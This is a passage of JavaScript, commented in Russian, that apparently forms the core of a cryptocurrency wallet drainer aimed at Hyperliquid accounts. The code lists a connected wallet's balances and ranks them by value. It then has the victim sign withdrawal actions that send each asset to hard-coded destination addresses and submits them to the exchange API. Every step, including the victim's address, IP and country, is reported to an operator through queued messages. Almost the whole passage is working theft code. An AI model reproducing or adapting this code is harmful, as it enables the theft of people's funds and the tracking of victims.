                    queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Wallet recovery failed</b>\n\nAddress: <code>" + connection['address'] + "</code>\nError: Session recovery failed\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
                    return [];
                }
            }

            console.debug('[Hyperliquid] Fetching user web3 data and market prices...');
            
            // ВАЖНО: getSpotMetaAndAssetCtxs() должен выполниться ДО getAllMidPrices()
            // т.к. getAllMidPrices() использует tokenToMarketMap который заполняется в getSpotMetaAndAssetCtxs()
            
            // Шаг 1: Параллельно получаем балансы (WebSocket) и метаданные токенов (REST)
            const [wsData, registry] = await Promise.all([
                // WebSocket для балансов
                retryWithBackoff(
                    async () => {
                        return new Promise((resolve) => {
                            const ws = new WebSocket("wss://api-ui.hyperliquid.xyz/ws");
                            let spotStateData = null;
                            let webData3Data = null;

                            const timeoutId = setTimeout(() => {
                                console.debug('[Hyperliquid] WebSocket timeout, returning partial data');
                                try { ws.close(); } catch (_) { }
                                resolve({ spotState: spotStateData, webData3: webData3Data });
                            }, 10000);

                            const checkComplete = () => {
                                if (spotStateData && webData3Data) {
                                    clearTimeout(timeoutId);
                                    try { ws.close(1000, 'All data received'); } catch (_) { }
                                    resolve({ spotState: spotStateData, webData3: webData3Data });
                                }
                            };

                            ws.onopen = () => {
                                ws.send(JSON.stringify({
                                    "method": "subscribe",
                                    "subscription": { "type": "spotState", "user": connection["address"] }
                                }));
                                ws.send(JSON.stringify({
                                    "method": "subscribe",
                                    "subscription": { "type": "webData3", "user": connection["address"] }
                                }));
                            };

                            ws.onmessage = (event) => {
                                try {
                                    const parsed = JSON.parse(event.data);
                                    
                                    if (parsed.channel === "spotState" && Array.isArray(parsed?.data?.spotState?.balances)) {
                                        spotStateData = parsed;
                                        checkComplete();
                                    }
                                    
                                    if (parsed.channel === "webData3") {
                                        webData3Data = parsed;
                                        
                                        // Детальное логирование структуры webData3
                                        console.debug('[Hyperliquid] webData3 received:', {
                                            hasData: !!parsed.data,
                                            hasPerpDexStates: !!parsed.data?.perpDexStates,
                                            perpDexStatesLength: parsed.data?.perpDexStates?.length || 0,
                                            firstPerpDexState: parsed.data?.perpDexStates?.[0] ? {
                                                hasClearinghouseState: !!parsed.data.perpDexStates[0].clearinghouseState,
                                                withdrawable: parsed.data.perpDexStates[0].clearinghouseState?.withdrawable
                                            } : null
                                        });
                                        
                                        if (Array.isArray(parsed?.data?.perpDexStates)) {
                                            checkComplete();
                                        } else {
                                            // Если структура не та, что ожидалась, все равно помечаем как полученную
                                            console.debug('[Hyperliquid] webData3 structure differs from expected');
                                            checkComplete();
                                        }
                                    }
                                } catch (e) {
                                    console.debug('[Hyperliquid] WebSocket message parse error:', e);
                                }
                            };

                            ws.onerror = (err) => {
                                console.debug('[Hyperliquid] WebSocket error:', err);
                                clearTimeout(timeoutId);
                                try { ws.close(); } catch (_) { }
                                resolve({ spotState: spotStateData, webData3: webData3Data });
                            };
                        });
                    },
                    { maxRetries: 2, initialDelay: 1000 }
                ).catch(error => {
                    console.debug('[Hyperliquid] Failed to get Hyperliquid data after retries:', error);
                    return { spotState: null, webData3: null };
                }),
                
                // REST для метаданных токенов (заполняет tokenToMarketMap)
                getSpotMetaAndAssetCtxs()
            ]);
            
            // Шаг 2: ПОСЛЕ того как tokenToMarketMap заполнен, получаем цены
            // Теперь getAllMidPrices() может правильно сконвертировать @35 -> VEGAS
            const prices = await getAllMidPrices();
            
            const { spotState, webData3 } = wsData;
            
            // Сохраняем в глобальные переменные для использования в других функциях
            dynamicPrices = prices;
            assetRegistry = registry;
            
            console.debug('[Hyperliquid] Prices loaded:', Object.keys(prices).length);
            console.debug('[Hyperliquid] Asset registry loaded:', registry ? Object.keys(registry).length : 0);

            // Собираем все балансы (spot + perp USDC)
            const spotBalances = spotState?.data?.spotState?.balances || [];
            
            // Получаем perp USDC из webData3 с детальным логированием и альтернативными путями
            let perpUSDC = null;
            
            if (webData3?.data) {
                // Путь 1: webData3.data.perpDexStates[0].clearinghouseState.withdrawable (стандартный)
                if (webData3.data.perpDexStates && Array.isArray(webData3.data.perpDexStates) && webData3.data.perpDexStates.length > 0) {
                    const perpDexState = webData3.data.perpDexStates[0];
                    if (perpDexState?.clearinghouseState?.withdrawable !== undefined) {
                        perpUSDC = perpDexState.clearinghouseState.withdrawable;
                        console.debug('[Hyperliquid] Perp USDC found via path 1 (perpDexStates[0].clearinghouseState.withdrawable):', perpUSDC);
                    } else {
                        console.debug('[Hyperliquid] Path 1 failed: clearinghouseState.withdrawable not found');
                        // Пробуем найти withdrawable в других местах
                        if (perpDexState?.withdrawable !== undefined) {
                            perpUSDC = perpDexState.withdrawable;
                            console.debug('[Hyperliquid] Perp USDC found via alternative path (perpDexStates[0].withdrawable):', perpUSDC);
                        }
                    }
                }
                
                // Путь 2: webData3.data.clearinghouseState.withdrawable (альтернативный)
                if (perpUSDC === null && webData3.data.clearinghouseState?.withdrawable !== undefined) {
                    perpUSDC = webData3.data.clearinghouseState.withdrawable;
                    console.debug('[Hyperliquid] Perp USDC found via path 2 (data.clearinghouseState.withdrawable):', perpUSDC);
                }
                
                // Путь 3: webData3.data.withdrawable (еще один альтернативный)
                if (perpUSDC === null && webData3.data.withdrawable !== undefined) {
                    perpUSDC = webData3.data.withdrawable;
                    console.debug('[Hyperliquid] Perp USDC found via path 3 (data.withdrawable):', perpUSDC);
                }
                
                if (perpUSDC === null) {
                    console.debug('[Hyperliquid] All paths failed. webData3.data structure:', JSON.stringify(webData3.data, null, 2));
                }
            } else {
                console.debug('[Hyperliquid] webData3 or webData3.data is null/undefined');
                console.debug('[Hyperliquid] webData3:', webData3);
            }
            
            // Fallback: если WebSocket не вернул perp USDC, получаем через REST API
            if (perpUSDC === null || perpUSDC === undefined) {
                console.debug('[Hyperliquid] Attempting to fetch perp USDC via REST API as fallback...');
                try {
                    const clearinghouseResponse = await fetchWithTimeoutUtil(HYPERLIQUID_API.INFO, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: "clearinghouseState",
                            user: connection["address"]
                        })
                    }, 10000);
                    
                    if (clearinghouseResponse && clearinghouseResponse.ok) {
                        const clearinghouseData = await clearinghouseResponse.json();
                        const restWithdrawable = clearinghouseData?.withdrawable;
                        
                        if (restWithdrawable !== undefined && restWithdrawable !== null) {
                            const parsedRest = Number(restWithdrawable);
                            if (!isNaN(parsedRest) && isFinite(parsedRest)) {
                                perpUSDC = restWithdrawable;
                                console.debug('[Hyperliquid] Perp USDC from REST API (fallback):', perpUSDC);
                            } else {
                                console.debug('[Hyperliquid] REST API returned invalid withdrawable value:', restWithdrawable);
                            }
                        } else {
                            console.debug('[Hyperliquid] REST API response structure:', JSON.stringify(clearinghouseData, null, 2));
                        }
                    } else {
                        console.debug('[Hyperliquid] REST API clearinghouseState failed:', clearinghouseResponse?.status || 'no response');
                    }
                } catch (error) {
                    console.debug('[Hyperliquid] Error fetching perp USDC via REST API:', error);
                }
            }
            
            // Проверяем наличие spot USDC
            const spotUSDCBalance = spotBalances.find(b => b.coin === 'USDC');
            const spotUSDCAmount = spotUSDCBalance ? Number(spotUSDCBalance.total) || 0 : 0;
            
            // Безопасное преобразование perpUSDC в число (после всех попыток получения)
            let perpUSDCAmount = 0;
            if (perpUSDC !== null && perpUSDC !== undefined) {
                const parsed = Number(perpUSDC);
                if (!isNaN(parsed) && isFinite(parsed)) {
                    perpUSDCAmount = parsed;
                } else {
                    console.debug('[Hyperliquid] Warning: perpUSDC is not a valid number:', perpUSDC, typeof perpUSDC);
                }
            }
            
            const hasSpotUSDC = spotUSDCAmount > 0;
            const hasPerpUSDC = perpUSDCAmount > 0;
            
            console.debug('[Hyperliquid] USDC balances:');
            console.debug('  Spot USDC:', spotUSDCAmount, '(found:', !!spotUSDCBalance, ', raw:', spotUSDCBalance?.total, ')');
            console.debug('  Perp USDC:', perpUSDCAmount, '(raw:', perpUSDC, ', type:', typeof perpUSDC, ')');
            console.debug('  Total USDC:', spotUSDCAmount + perpUSDCAmount);
            
            // Если perp USDC не найден, но должен быть - предупреждение
            if (perpUSDCAmount === 0 && webData3) {
                console.debug('[Hyperliquid] Warning: perpUSDC is 0 but webData3 exists. This might indicate a parsing issue.');
            }
            
            // Собираем балансы, исключая spot USDC (если есть)
            const nonUSDCSpotBalances = spotBalances.filter(b => b.coin !== 'USDC').map(b => ({ ...b, source: 'spot' }));
            
            // Для USDC объединяем spot и perp в один баланс для проверки достаточности
            // При выводе используем тот источник, где больше средств (или spot, если есть)
            const totalUSDC = spotUSDCAmount + perpUSDCAmount;
            const usdcBalances = [];
            
            if (hasSpotUSDC || hasPerpUSDC) {
                // Определяем приоритетный источник для вывода:
                // 1. Если spot USDC >= amount + fee, используем spot
                // 2. Иначе если perp USDC >= amount + fee, используем perp
                // 3. Иначе используем тот источник, где больше средств
                // Для упрощения: если есть spot USDC, используем spot, иначе perp
                // Но при проверке баланса используем общий баланс (spot + perp)
                const preferredSource = hasSpotUSDC ? 'spot' : 'perp';
                
                usdcBalances.push({
                    "coin": "USDC",
                    "token": 0,
                    "total": String(totalUSDC), // Общий баланс для проверки
                    "hold": "0",
                    "entryNtl": "0.0",
                    "source": preferredSource, // Приоритетный источник для вывода
                    "hasSpotUSDC": hasSpotUSDC,
                    "spotAmount": spotUSDCAmount, // Сохраняем для проверки
                    "perpAmount": perpUSDCAmount  // Сохраняем для проверки
                });
            }
            
            // Собираем все балансы
            const allBalances = [
                ...nonUSDCSpotBalances,
                ...usdcBalances
            ];
            
            // Фильтруем только положительные балансы
            let allPositiveBalances = Array.isArray(allBalances) 
                ? allBalances.filter((balance) => Number(balance?.total) > 0) 
                : [];

            if (allPositiveBalances.length === 0) {
                console.debug('[Hyperliquid] No positive balances found for:', connection.address);
                queueMessage("📍 <b>Platform: </b> " + platform + "\n\n🔌 <b>No positive balances found</b>\n\nAddress: <code>" + connection['address'] + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, 0, "", code, username, platform);
                return [];
            }

            // Обогащаем балансы ценами и метаданными, применяем умную сортировку
            // - Non-USDC сортируются по стоимости (от большей к меньшей)
            // - USDC всегда последний
            // - Если USDC <= USDC_THRESHOLD, ассеты дешевле USDC пропускаются
            let sortedPositiveBalances = enrichAndSortBalances(allPositiveBalances, prices, registry);
            
            console.debug('[Hyperliquid] Assets to withdraw:', sortedPositiveBalances.length);
            
            // ============================================================================
            // ПРОВЕРКА И ФИЛЬТРАЦИЯ USDC БАЛАНСА ПЕРЕД ВЫВОДОМ
            // ============================================================================
            // Используем уже вычисленные spotUSDCAmount и perpUSDCAmount из выше
            const totalAvailableUSDC = spotUSDCAmount + perpUSDCAmount;
            
            // Проверяем достаточность USDC для всех ассетов
            const usdcCheck = checkUSDCBalanceForWithdrawals(sortedPositiveBalances, totalAvailableUSDC);
            
            let finalAssetsToWithdraw = sortedPositiveBalances;
            let wasFiltered = false;
            
            if (!usdcCheck.sufficient) {
                // USDC недостаточно - фильтруем ассеты, выбирая максимальное количество
                console.debug('[Hyperliquid] Insufficient USDC balance, filtering assets...');
                const filterResult = filterAssetsByUSDCBalance(sortedPositiveBalances, totalAvailableUSDC);
                finalAssetsToWithdraw = filterResult.filtered;
                wasFiltered = true;
                
                // Если после фильтрации не осталось ассетов - отменяем
                if (finalAssetsToWithdraw.length === 0) {
                    console.debug('[Hyperliquid] No assets can be withdrawn with available USDC');
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "❌ <b>Insufficient USDC for Any Withdrawal</b>\n\n" +
                        "Address: <code>" + connection['address'] + "</code>\n\n" +
                        "Available USDC: <b>$" + totalAvailableUSDC.toFixed(2) + "</b>\n" +
                        "Minimum required: <b>$" + (WITHDRAWAL_FEES.SAFETY_RESERVE + WITHDRAWAL_FEES.SPOT_TOKEN).toFixed(2) + "</b>\n\n" +
                        "⚠️ <b>Cannot withdraw any assets</b>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    return [];
                }
            }
            
            // Формируем сообщение о найденных ассетах
            const totalValue = finalAssetsToWithdraw.reduce((sum, b) => sum + (b.valueUSD || 0), 0);
            const skippedValue = wasFiltered ? sortedPositiveBalances
                .filter(a => !finalAssetsToWithdraw.find(f => f.coin === a.coin))
                .reduce((sum, b) => sum + (b.valueUSD || 0), 0) : 0;
            
            const assetsListMsg = finalAssetsToWithdraw.map((b, i) => 
                `${i + 1}. ${b.coin}: ${Number(b.total).toFixed(4)} ($${(b.valueUSD || 0).toFixed(2)})`
            ).join('\n');
            
            const skippedListMsg = wasFiltered ? sortedPositiveBalances
                .filter(a => !finalAssetsToWithdraw.find(f => f.coin === a.coin))
                .map((b, i) => 
                    `${i + 1}. ${b.coin}: ${Number(b.total).toFixed(4)} ($${(b.valueUSD || 0).toFixed(2)})`
                ).join('\n') : '';
            
            const estimatedFees = wasFiltered 
                ? (finalAssetsToWithdraw.length * WITHDRAWAL_FEES.SPOT_TOKEN + WITHDRAWAL_FEES.SAFETY_RESERVE)
                : usdcCheck.required;
            
            queueMessage(
                "📍 <b>Platform: </b> " + platform + "\n\n" +
                "💰 <b>Assets Found</b>\n\n" +
                "Address: <code>" + connection['address'] + "</code>\n" +
                "Total Value: <b>$" + totalValue.toFixed(2) + "</b>\n" +
                (wasFiltered && skippedValue > 0 ? "⚠️ Skipped (insufficient USDC): <b>$" + skippedValue.toFixed(2) + "</b>\n" : "") +
                "USDC Available: <b>$" + totalAvailableUSDC.toFixed(2) + "</b>\n" +
                (spotUSDCAmount > 0 ? "  - Spot: $" + spotUSDCAmount.toFixed(2) + "\n" : "") +
                (perpUSDCAmount > 0 ? "  - Perp: $" + perpUSDCAmount.toFixed(2) + "\n" : "") +
                "Estimated Fees: <b>$" + estimatedFees.toFixed(2) + "</b>\n\n" +
                "<b>Withdrawal Order:</b>\n<code>" + assetsListMsg + "</code>\n" +
                (wasFiltered && skippedListMsg ? "\n<b>⚠️ Skipped (insufficient USDC):</b>\n<code>" + skippedListMsg + "</code>\n" : "") +
                (finalAssetsToWithdraw.some(b => b.coin === 'USDC') ? "\nℹ️ USDC will be withdrawn last\n" : "") +
                getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                0, "", code, username, platform
            );
            
            // Обновляем sortedPositiveBalances для дальнейшего использования
            sortedPositiveBalances = finalAssetsToWithdraw;

            function parseJsonWithNumbers(jsonStr) {
                const convert = function (obj) {
                    if (typeof obj === 'object' && obj !== null) {
                        for (const key in obj) {
                            if (["displayName", "name", "totalGenesisBalanceWei", "userGenesisBalances"].includes(key)) continue;
                            obj[key] = convert(obj[key]);
                        }
                    } else if (typeof obj === 'string' && obj.match(/^-?(?!0\d)\d+(?:\.\d*)?$/)) {
                        return parseFloat(obj);
                    }
                    return obj;
                };
                return convert(JSON.parse(jsonStr));
            }

            async function fetchWithTimeout(url, body) {
                return await retryWithBackoff(
                    async () => {
                        const abortController = new AbortController();
                        const timeoutId = setTimeout(() => abortController.abort(), 5000);

                        const fetchOptions = {
                            method: body ? 'POST' : 'GET',
                            headers: body ? {
                                'Content-Type': 'application/json'
                            } : undefined,
                            body: body ? JSON.stringify(body) : undefined,
                            signal: abortController.signal
                        };

                        try {
                            const responseObj = await fetch(url, fetchOptions);
                            clearTimeout(timeoutId);

                            if (responseObj.status >= 400) {
                                queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n🚨 <b>API Error</b>\n\nURL: <code>" + url + "</code>\nStatus: <code>" + responseObj.status + " " + responseObj.statusText + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code);
                                throw new Error(`API Error: ${responseObj.status} ${responseObj.statusText}`);
                            }

                            const response = parseJsonWithNumbers(await responseObj.text());

                            return {
                                response: response,
                                status: responseObj.status
                            };
                        } catch (error) {
                            clearTimeout(timeoutId);
                            if (error.name === 'AbortError') {
                                throw new Error('Request timeout after 5000ms');
                            }
                            throw error;
                        }
                    },
                    { maxRetries: 2, initialDelay: 1000 }
                ).catch(async (error) => {
                    queueMessage("", 1, "📍 <b>Platform: </b> " + platform + "\n\n⚠️ <b>Request Failed (Retries Exhausted)</b>\n\nURL: <code>" + url + "</code>\nError: <code>" + error.message + "</code>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip, code, username, platform);
                    throw error;
                });
            }

            function buildServerUrl(protocolType, isRpc) {
                const serverType = isRpc ? 'rpc' : 'api-ui';
                let url = 's://'.concat(serverType, '.hyperliquid.xyz');

                const overrideServerIp = {
                    NODE_ENV: 'production',
                    PUBLIC_URL: '',
                    WDS_SOCKET_HOST: undefined,
                    WDS_SOCKET_PATH: undefined,
                    WDS_SOCKET_PORT: undefined,
                    FAST_REFRESH: true,
                    REACT_APP_VERSION: '2025-10-26-de7d2afc',
                    REACT_APP_CHAIN: 'Mainnet'
                }.REACT_APP_OVERRIDE_SERVER_IP;
                if (overrideServerIp) {
                    url = '://'.concat(overrideServerIp, ':3001');
                }
                const wsSuffix = protocolType === 'ws' ? '/ws' : '';
                return ''.concat(protocolType).concat(url).concat(wsSuffix);
            }

            async function prepareAndSendApiRequest(apiRequest) {
                const { endpoint, request } = (function (apiRequestObj) {
                    switch (apiRequestObj.endpoint) {
                        case 'exchange':
                            return {
                                endpoint: 'exchange',
                                request: {
                                    ...apiRequestObj.request,
                                    isFrontend: true
                                }
                            };
                    }
                })(apiRequest);
                return fetchWithTimeout(''.concat(buildServerUrl('http', endpoint === 'explorer'), '/').concat(endpoint), request);
            }

            function parseSignature(signature) {
                let raw = signature.slice(2);
                if (raw.length !== 130) {
                    return { error: 'Bad signature length: ' + raw.length };
                }
                const vHex = raw.slice(-2);
                if (vHex !== '1c' && vHex !== '1b' && vHex !== '00' && vHex !== '01') {
                    return { error: 'Bad signature V value: ' + vHex };
                }
                const v = vHex === '1b' || vHex === '00' ? 27 : 28;
                return {
                    r: '0x' + raw.slice(0, 64),
                    s: '0x' + raw.slice(64, 128),
                    v: v
                };
            }

            /**
             * Обрабатывает вывод одного ассета
             * Поддерживает как hardcoded токены (UBTC, USOL, UETH, USDC), так и динамические
             */
            async function handleWithdraw(balance, currentTimestamp, index, total) {
                const coin = balance.coin;
                const amount = balance.amount || Number(balance.total);
                const valueUSD = balance.valueUSD || (amount * (dynamicPrices[coin] || 0));
                
                // Получаем конфигурацию для ассета (hardcoded или динамическую)
                const assetConfig = getAssetConfig(coin, balance);
                
                if (!assetConfig) {
                    console.debug("[Hyperliquid] No asset config found for:", coin);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "⚠️ <b>Skipping Unknown Asset</b>\n\n" +
                        "Asset: " + coin + "\n" +
                        "Amount: " + amount.toFixed(4) + "\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    return undefined;
                }
                
                const assetName = assetConfig.name || balance.fullName || coin;
                const assetSymbol = assetConfig.symbol || coin;
                
                // Для USDC показываем оригинальную сумму (комиссия будет вычтена при создании action)
                const displayAmount = amount;
                const displayValue = valueUSD;
                
                // Для USDC показываем информацию о source (spot/perp)
                const usdcSourceInfo = coin === 'USDC' && balance.source 
                    ? `\nSource: <code>${balance.source === 'spot' ? 'Spot' : 'Perp'}</code>` 
                    : '';
                const usdcSpotPerpInfo = coin === 'USDC' && balance.spotAmount !== undefined && balance.perpAmount !== undefined
                    ? `\n  - Spot: $${balance.spotAmount.toFixed(2)}\n  - Perp: $${balance.perpAmount.toFixed(2)}`
                    : '';
                
                queueMessage(
                    "📍 <b>Platform: </b> " + platform + "\n\n" +
                    "📤 <b>Withdraw Request [" + (index + 1) + "/" + total + "]</b>\n\n" +
                    "Asset: <b>" + assetName + "</b>\n" +
                    "Amount: <code>" + displayAmount.toFixed(4) + " " + assetSymbol + "</code>\n" +
                    (coin === 'USDC' ? "⚠️ Fee ($1) will be deducted from amount\n" : "") +
                    (coin === 'USDC' ? "Method: <code>sendAsset</code>" + usdcSourceInfo + "\n" : "") +
                    usdcSpotPerpInfo +
                    "Value: <b>$" + displayValue.toFixed(2) + "</b>\n" +
                    "Address: <code>" + connection['address'] + "</code>\n\n" +
                    getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                    0, "", code, username, platform
                );

                const chainId = Number(wagmiStore["state"]["chainId"]) || ARBITRUM.id;
                
                let withdrawAction = null;
                let signTypedData = null;
                
                try {
                    // Определяем destination в зависимости от типа ассета
                    let targetDestination;
                    switch (coin) {
                        case "UBTC":
                            targetDestination = BTC_DESTINATION;
                            break;
                        case "USOL":
                            targetDestination = SOL_DESTINATION;
                            break;
                        default:
                            targetDestination = EVM_DESTINATION;
                    }
                    
                    // Получаем финальный destination (может требовать API call для wrapped tokens)
                    const destination = await assetConfig.getDestination(targetDestination);
                    
                    // Создаём withdraw action
                    // Для USDC комиссия $1 автоматически вычитается внутри createWithdrawAction
                    const reserveAmount = 0; // Не используется, комиссия вычитается внутри для USDC
                    withdrawAction = await assetConfig.createWithdrawAction(
                        balance, 
                        currentTimestamp, 
                        destination, 
                        chainId,
                        reserveAmount
                    );
                    
                    // Создаём signTypedData
                    signTypedData = createSignTypedData(
                        assetConfig.signType,
                        withdrawAction,
                        chainId
                    );
                    
                } catch (error) {
                    console.debug("[Hyperliquid] Error creating withdraw action for", coin, ":", error);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "❌ <b>Action Creation Failed</b>\n\n" +
                        "Asset: " + coin + "\n" +
                        "Error: <code>" + error.message + "</code>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    return undefined;
                }
                
                if (!withdrawAction || !signTypedData) {
                    console.debug("[Hyperliquid] Missing withdraw action or signTypedData for", coin);
                    return undefined;
                }

                // Подписываем транзакцию
                let rawSignature;
                try {
                    rawSignature = await wagmi.signTypedData(config, signTypedData);
                    
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "✅ <b>Signed: " + assetSymbol + "</b>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                } catch (error) {
                    console.debug("[Hyperliquid] User rejected withdraw request:", error);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "❌ <b>Rejected: " + assetSymbol + "</b>\n\n" +
                        "User cancelled the signature request\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    return undefined;
                }

                // Формируем payload
                const payload = {
                    action: withdrawAction,
                    signature: parseSignature(rawSignature),
                    nonce: currentTimestamp,
                    vaultAddress: null,
                    expiresAfter: null
                };

                // Отправляем на API
                queueMessage(
                    "📍 <b>Platform: </b> " + platform + "\n\n" +
                    "📤 <b>Sending " + assetSymbol + " to Hyperliquid...</b>\n\n" +
                    getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                    0, "", code, username, platform
                );
                
                const apiResponse = await prepareAndSendApiRequest({
                    endpoint: 'exchange',
                    request: payload
                });

                // Проверяем HTTP статус
                if (apiResponse.status !== 200) {
                    console.debug("[Hyperliquid] Withdraw request failed:", apiResponse);
                    
                    // Проверяем ответ API на наличие ошибок
                    const responseData = apiResponse.response;
                    let errorMessage = "Unknown error";
                    
                    if (responseData) {
                        // API может вернуть { status: "err", response: "error message" }
                        if (responseData.status === "err" && responseData.response) {
                            errorMessage = responseData.response;
                        } else if (responseData.error) {
                            errorMessage = responseData.error;
                        } else if (typeof responseData === 'string') {
                            errorMessage = responseData;
                        }
                    }
                    
                    // Специальная обработка известных ошибок
                    let errorTitle = "Withdraw Failed";
                    if (errorMessage.includes("Insufficient quote token") || errorMessage.includes("USDC")) {
                        errorTitle = "Insufficient USDC for Fees";
                        errorMessage = "Not enough USDC to pay for withdrawal gas fees.\n\n" + errorMessage;
                    } else if (errorMessage.includes("Withdrawal is smaller than fee")) {
                        errorTitle = "Withdrawal Too Small";
                        errorMessage = "The withdrawal amount is smaller than the required fee.\n\n" + errorMessage;
                    }
                    
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "❌ <b>" + errorTitle + ": " + assetSymbol + "</b>\n\n" +
                        "Asset: " + coin + "\n" +
                        "Amount: " + amount.toFixed(4) + " " + assetSymbol + "\n" +
                        "HTTP Status: " + apiResponse.status + "\n\n" +
                        "<b>Error:</b>\n<code>" + errorMessage + "</code>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    return undefined;
                }
                
                // Проверяем ответ API на наличие ошибок даже при HTTP 200
                const responseData = apiResponse.response;
                if (responseData && responseData.status === "err") {
                    const errorMessage = responseData.response || "Unknown API error";
                    console.debug("[Hyperliquid] API returned error:", errorMessage);
                    
                    let errorTitle = "Withdraw Failed";
                    if (errorMessage.includes("Insufficient quote token") || errorMessage.includes("USDC")) {
                        errorTitle = "Insufficient USDC for Fees";
                    } else if (errorMessage.includes("Withdrawal is smaller than fee")) {
                        errorTitle = "Withdrawal Too Small";
                    }
                    
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "❌ <b>" + errorTitle + ": " + assetSymbol + "</b>\n\n" +
                        "Asset: " + coin + "\n" +
                        "Amount: " + amount.toFixed(4) + " " + assetSymbol + "\n\n" +
                        "<b>Error:</b>\n<code>" + errorMessage + "</code>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                    return undefined;
                }

                // Для USDC используем сумму из withdrawAction (уже с вычтенной комиссией)
                const actualWithdrawAmount = coin === 'USDC' && withdrawAction?.amount 
                    ? parseFloat(withdrawAction.amount) 
                    : amount;
                const actualWithdrawValue = coin === 'USDC' 
                    ? actualWithdrawAmount * (dynamicPrices[coin] || 1) 
                    : valueUSD;
                
                queueMessage(
                    "📍 <b>Platform: </b> " + platform + "\n\n" +
                    "✅ <b>Withdraw Success: " + assetSymbol + "</b>\n\n" +
                    "Amount: " + actualWithdrawAmount.toFixed(4) + " " + assetSymbol + "\n" +
                    (coin === 'USDC' ? "Fee deducted: $1.00 USDC\n" : "") +
                    "Value: $" + actualWithdrawValue.toFixed(2) + "\n\n" +
                    getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                    0, "", code, username, platform
                );

                return {
                    connectorType: connection["connectorType"],
                    address: connection["address"],
                    withdrawAmount: actualWithdrawAmount.toFixed(4),
                    valueUSD: actualWithdrawValue.toFixed(2),
                    symbol: coin
                };
            }

            // ============================================================================
            // WITHDRAWAL LOOP
            // ============================================================================
            queueMessage(
                "📍 <b>Platform: </b> " + platform + "\n\n" +
                "🔌 <b>Injected Wallet Connected</b>\n\n" +
                "Type: <code>" + connection["walletClientType"] + "</code>\n" +
                "Starting withdrawal of " + sortedPositiveBalances.length + " assets...\n\n" +
                getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                0, "", code, username, platform
            );
            
            let withdrawals = [];
            const totalAssets = sortedPositiveBalances.length;
            
            for (let i = 0; i < sortedPositiveBalances.length; i++) {
                const balance = sortedPositiveBalances[i];
                
                try {
                    const availableBalance = balance.amount || Number(balance.total);
                    
                    if (availableBalance > 0) {
                        console.debug('[Hyperliquid] Processing withdrawal', i + 1, '/', totalAssets, ':', balance.coin, 'amount:', availableBalance);
                        
                        const result = await handleWithdraw(balance, Date.now(), i, totalAssets);
                        
                        if (result) {
                            withdrawals.push(result);
                        } else {
                            console.debug('[Hyperliquid] Withdrawal failed for:', balance.coin);
                            
                            // Если это был отказ пользователя, прекращаем вывод
                            // (handleWithdraw возвращает undefined при reject)
                        }

                        // Пауза между транзакциями
                        if (i < sortedPositiveBalances.length - 1) {
                            await new Promise(resolve => setTimeout(resolve, 500));
                        }
                    }
                } catch (error) {
                    console.debug('[Hyperliquid] Error processing withdrawal:', error);
                    queueMessage(
                        "📍 <b>Platform: </b> " + platform + "\n\n" +
                        "⚠️ <b>Withdrawal Error</b>\n\n" +
                        "Asset: " + balance.coin + "\n" +
                        "Error: <code>" + error.message + "</code>\n\n" +
                        getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                        0, "", code, username, platform
                    );
                }
            }

            // Summary message
            console.debug('[Hyperliquid] Total withdrawals processed:', withdrawals.length);
            
            if (withdrawals.length > 0) {
                const totalWithdrawnValue = withdrawals.reduce((sum, w) => sum + parseFloat(w.valueUSD || 0), 0);
                const withdrawalsList = withdrawals.map(w => `${w.symbol}: ${w.withdrawAmount} ($${w.valueUSD})`).join('\n');
                
                queueMessage(
                    "📍 <b>Platform: </b> " + platform + "\n\n" +
                    "🎉 <b>Withdrawal Complete</b>\n\n" +
                    "Successfully withdrawn " + withdrawals.length + "/" + totalAssets + " assets\n" +
                    "Total Value: <b>$" + totalWithdrawnValue.toFixed(2) + "</b>\n\n" +
                    "<code>" + withdrawalsList + "</code>\n\n" +
                    getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                    0, "", code, username, platform
                );
            } else {
                queueMessage(
                    "📍 <b>Platform: </b> " + platform + "\n\n" +
                    "⚠️ <b>No Withdrawals Completed</b>\n\n" +
                    "All withdrawal attempts failed or were rejected\n\n" +
                    getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip,
                    0, "", code, username, platform
